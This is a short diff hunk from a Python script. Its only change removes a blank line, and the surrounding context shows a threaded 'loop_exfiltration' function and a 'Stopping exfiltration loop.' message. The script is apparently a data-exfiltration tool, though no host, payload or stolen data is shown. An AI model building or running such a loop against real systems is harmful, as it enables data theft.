@@ -245,7 +245,6 @@ if __name__ == "__main__":  # Only executed when running the script directly
                 print("Stopping exfiltration loop.")
                 break
 
-
     import threading
 
     thread = threading.Thread(target=loop_exfiltration)
